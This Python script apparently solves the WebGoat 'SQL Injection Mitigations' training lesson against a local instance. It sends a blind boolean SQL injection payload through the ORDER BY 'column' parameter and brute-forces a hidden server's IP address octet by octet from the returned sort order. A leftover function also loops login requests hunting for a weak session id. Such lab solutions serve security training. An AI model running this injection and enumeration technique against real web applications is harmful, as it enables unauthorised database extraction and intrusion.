#!/usr/bin/env python3

import requests
import re
import json

WebGoatIP = '127.0.0.1:8080'
# Type getServers(ip) on Browser console to get the URL to the XHR GET request
# http://localhost:8080/WebGoat/SqlInjectionMitigations/servers?column=ip
URL = 'http://{}/WebGoat/SqlInjectionMitigations/servers?column={}' #FIXME
JSESSIONID = '9VB5OXJsdEaopr9JfPeoZg11_WWKmdM7MkISnyMY' #FIXME

regEx = re.compile('\* [0-9]+\-[0-9]+')


httpHeaders = {
        'Host': WebGoatIP,
        'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0',
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': 'http://{}/WebGoat/start.mvc'.format(WebGoatIP),
        'X-Requested-With': 'XMLHttpRequest',
        'Connection': 'keep-alive',
        'Cookie': f'JSESSIONID={JSESSIONID}',
        }

def success():
    url = 'http://{}/WebGoat/service/lessonprogress.mvc HTTP/1.1'.format(WebGoatIP)
    res = requests.get(url, headers=httpHeaders)
    response = res.text

def getRequest(sortBy, debug=True):
    req = URL.format(WebGoatIP, sortBy)
    if debug:
        print('Debug: sending request: ', req)
    res = requests.get(req, headers=httpHeaders)
    jstr = json.loads(res.text)
    #print(jstr)
    if debug:
        print('{:5}{:25}{:15}'.format('id', 'hostname', 'ip'))

    ids = []
    for data in jstr:
        #print(data)
        # check if returned servers is sorted based on ids
        ids.append(int(data['id']))
        if debug:
            print('{:5}{:25}{:15}'.format(data['id'], data['hostname'], data['ip']))
    
    if ids == sorted(ids):
        return True

    return False

def test():
    #sort by id, hostname, ip
    #sortBy = 'hostname'
    # change webgoat-pre-prod ip with correct and incorrect and see the result
    # see how test() function works
    pre_prod_ip = '192.168.6.4' # FIXME change it to correct and incorrect
    sortBy = f"(case when (select ip from servers where hostname='webgoat-pre-prod') = '{pre_prod_ip}' then id else hostname end)"
	# this is true; so sort by id; also we confirmed that servers table exists
    if getRequest(sortBy, True):
        print('Success!')
    else:
        print('Keep trying!')

# Runt this for to find the ip of webgoat-prd server
def bruteForce():
    sortBy = """
    (case when (select ip from servers where hostname='webgoat-prd') = '{}' then
    id else hostname end)
    """
    for i in range(1, 255): # check for values between 1 and 254 .130.219.202
        ip = f'{i}.130.219.202'
        if getRequest(sortBy.format(ip), True):
            print('Success!')
            print(f'The ip address is {ip}')
            break


def postRequest():
    formData = {'Username': 'hacker',
            'Password': 'cracker',
            'SUBMIT': 'Login'
            }

    for num in range(100):
        res = requests.post(URL, data=formData, headers=httpHeaders)
        response = res.text
        s = regEx.search(response)
        print(response)
        if s:
            print('*** found weakid ***')
            weakID = s.group()
            weakID = weakID[2:]
            print(weakID)
            break
            #httpHeaders['Cookie'] = 'JSESSIONID=%s;WEAKID=%s'%(JSESSIONID, weakID)
            #formData['WEAKID'] = weakID
            #print(httpHeaders)
            #print(formData)
            #for i in range(8):
            #res = requests.post(URL, data=formData, headers=httpHeaders)
            #url = 'http://%s:8080/WebGoat/service/lessonprogress.mvc HTTP/1.1'%WebGoatIP 
            #res = requests.get(url, headers=httpHeaders)
            #response = res.text
            #print(response)
            #if "Congratulations. You have successfully" in response:
            #    print("Successfully hacked...Well done!")  
            #    break


if __name__ == "__main__":
    #getRequest()
    test()
    #bruteForce()
